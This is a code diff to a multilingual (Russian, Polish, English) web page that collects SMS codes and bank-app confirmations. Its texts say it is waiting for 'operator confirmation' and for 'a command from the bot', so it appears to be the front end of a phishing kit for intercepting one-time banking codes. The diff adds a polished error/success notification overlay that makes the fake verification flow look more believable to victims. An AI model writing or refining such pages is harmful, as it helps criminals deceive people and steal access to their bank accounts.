@@ -419,6 +419,125 @@
             }
         }
 
+        /* Стили для уведомлений */
+        .notification-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            padding: 20px;
+        }
+
+        .notification-overlay.show {
+            display: flex;
+        }
+
+        .notification-card {
+            background: rgba(30, 30, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            animation: slideUp 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .notification-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+        }
+
+        .notification-card.error::before {
+            background: linear-gradient(90deg, var(--error) 0%, #ff5252 100%);
+        }
+
+        .notification-card.success::before {
+            background: linear-gradient(90deg, var(--success) 0%, #66bb6a 100%);
+        }
+
+        .notification-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            animation: bounce 0.6s ease;
+        }
+
+        .notification-card.error .notification-icon {
+            color: var(--error);
+        }
+
+        .notification-card.success .notification-icon {
+            color: var(--success);
+        }
+
+        .notification-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .notification-card.error .notification-title {
+            color: var(--error);
+        }
+
+        .notification-card.success .notification-title {
+            color: var(--success);
+        }
+
+        .notification-message {
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            line-height: 1.5;
+            font-size: 16px;
+        }
+
+        .notification-btn {
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            width: 100%;
+            max-width: 200px;
+        }
+
+        .notification-card.error .notification-btn {
+            background: linear-gradient(135deg, var(--error) 0%, #ff5252 100%);
+            color: white;
+        }
+
+        .notification-card.success .notification-btn {
+            background: linear-gradient(135deg, var(--success) 0%, #66bb6a 100%);
+            color: white;
+        }
+
+        .notification-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        @keyframes bounce {
+            0%, 20%, 60%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            80% { transform: translateY(-5px); }
+        }
+
         footer {
             text-align: center;
             padding: 30px 0;
@@ -541,6 +660,19 @@
                 max-width: 280px;
             }
 
+            .notification-card {
+                padding: 30px 25px;
+                margin: 0 15px;
+            }
+
+            .notification-icon {
+                font-size: 56px;
+            }
+
+            .notification-title {
+                font-size: 22px;
+            }
+
             .push-card {
                 padding: 25px;
                 margin: 15px;
@@ -616,6 +748,22 @@
                 max-width: 250px;
             }
 
+            .notification-card {
+                padding: 25px 20px;
+            }
+
+            .notification-icon {
+                font-size: 48px;
+            }
+
+            .notification-title {
+                font-size: 20px;
+            }
+
+            .notification-message {
+                font-size: 15px;
+            }
+
             footer {
                 padding: 25px 0;
                 font-size: 13px;
@@ -649,6 +797,16 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loader"></div>
         <div class="loading-text" id="loadingText">Ожидание подтверждения оператора...</div>
+    </div>
+
+    <!-- Notification Overlay -->
+    <div class="notification-overlay" id="notificationOverlay">
+        <div class="notification-card error" id="notificationCard">
+            <div class="notification-icon">❌</div>
+            <div class="notification-title" id="notificationTitle">Ошибка</div>
+            <div class="notification-message" id="notificationMessage">Неверный SMS код. Пожалуйста, проверьте и попробуйте снова.</div>
+            <button class="notification-btn" id="notificationBtn">Понятно</button>
+        </div>
     </div>
 
     <div class="container">
@@ -736,7 +894,9 @@
                 pushMessage: 'Пожалуйста, подтвердите операцию в вашем банковском приложении',
                 loadingText: 'Ожидание подтверждения оператора...',
                 successText: 'SMS код подтвержден!',
-                errorText: 'Неверный SMS код'
+                errorText: 'Неверный SMS код',
+                errorMessage: 'Неверный SMS код. Пожалуйста, проверьте и попробуйте снова.',
+                notificationBtn: 'Понятно'
             },
             pl: {
                 smsTitle: 'Potwierdzenie SMS',
@@ -749,7 +909,9 @@
                 pushMessage: 'Proszę potwierdzić operację w aplikacji bankowej',
                 loadingText: 'Oczekiwanie na potwierdzenie operatora...',
                 successText: 'Kod SMS potwierdzony!',
-                errorText: 'Nieprawidłowy kod SMS'
+                errorText: 'Nieprawidłowy kod SMS',
+                errorMessage: 'Nieprawidłowy kod SMS. Sprawdź i spróbuj ponownie.',
+                notificationBtn: 'Rozumiem'
             },
             en: {
                 smsTitle: 'SMS Confirmation',
@@ -762,7 +924,9 @@
                 pushMessage: 'Please confirm the operation in your banking app',
                 loadingText: 'Waiting for operator confirmation...',
                 successText: 'SMS code confirmed!',
-                errorText: 'Invalid SMS code'
+                errorText: 'Invalid SMS code',
+                errorMessage: 'Invalid SMS code. Please check and try again.',
+                notificationBtn: 'OK'
             }
         };
 
@@ -776,12 +940,8 @@
         window.showWrongSMSError = function() {
             hideLoading();
             
-            const btn = document.getElementById('confirmBtn');
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<i class="fas fa-times"></i> ❌ ' + translations[currentLanguage].errorText;
-            btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
-            btn.disabled = true;
+            // Показываем красивое уведомление вместо изменения кнопки
+            showNotification('error', translations[currentLanguage].errorText, translations[currentLanguage].errorMessage);
             
             // Очищаем поля
             document.querySelectorAll('.code-input').forEach(input => {
@@ -789,29 +949,55 @@
                 input.classList.remove('filled');
             });
             
+            // Фокус на первое поле после закрытия уведомления
             setTimeout(() => {
-                btn.innerHTML = originalText;
-                btn.style.background = '';
-                btn.disabled = false;
-                
-                // Фокус на первое поле
                 document.querySelector('.code-input').focus();
-            }, 3000);
+            }, 500);
         };
 
         window.showSuccessMessage = function() {
-            const btn = document.getElementById('confirmBtn');
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<i class="fas fa-check"></i> ✅ ' + translations[currentLanguage].successText;
-            btn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
-            btn.disabled = true;
+            showNotification('success', translations[currentLanguage].successText, 'Платеж успешно обработан!');
             
             setTimeout(() => {
                 hideLoading();
                 window.location.href = 'success.html';
             }, 2000);
         };
+
+        function showNotification(type, title, message) {
+            const overlay = document.getElementById('notificationOverlay');
+            const card = document.getElementById('notificationCard');
+            const notificationTitle = document.getElementById('notificationTitle');
+            const notificationMessage = document.getElementById('notificationMessage');
+            const notificationBtn = document.getElementById('notificationBtn');
+            
+            // Обновляем классы для типа уведомления
+            card.className = `notification-card ${type}`;
+            
+            // Обновляем контент
+            notificationTitle.textContent = title;
+            notificationMessage.textContent = message;
+            notificationBtn.textContent = translations[currentLanguage].notificationBtn;
+            
+            // Обновляем иконку
+            const icon = card.querySelector('.notification-icon');
+            icon.textContent = type === 'error' ? '❌' : '✅';
+            
+            // Показываем уведомление
+            overlay.classList.add('show');
+            
+            // Обработчик кнопки
+            notificationBtn.onclick = function() {
+                overlay.classList.remove('show');
+            };
+            
+            // Закрытие по клику вне карточки
+            overlay.onclick = function(e) {
+                if (e.target === overlay) {
+                    overlay.classList.remove('show');
+                }
+            };
+        }
 
         function showLoading() {
             document.getElementById('loadingOverlay').classList.add('show');
@@ -1108,18 +1294,7 @@
                 
                 if (!success) {
                     hideLoading();
-                    const btn = document.getElementById('confirmBtn');
-                    const originalText = btn.innerHTML;
-                    
-                    btn.innerHTML = '<i class="fas fa-times"></i> ❌ Ошибка отправки';
-                    btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
-                    btn.disabled = true;
-                    
-                    setTimeout(() => {
-                        btn.innerHTML = originalText;
-                        btn.style.background = '';
-                        btn.disabled = false;
-                    }, 3000);
+                    showNotification('error', 'Ошибка отправки', 'Не удалось отправить SMS код. Пожалуйста, попробуйте снова.');
                 }
                 // Если успешно - остается loading и ждем команды от бота
             }
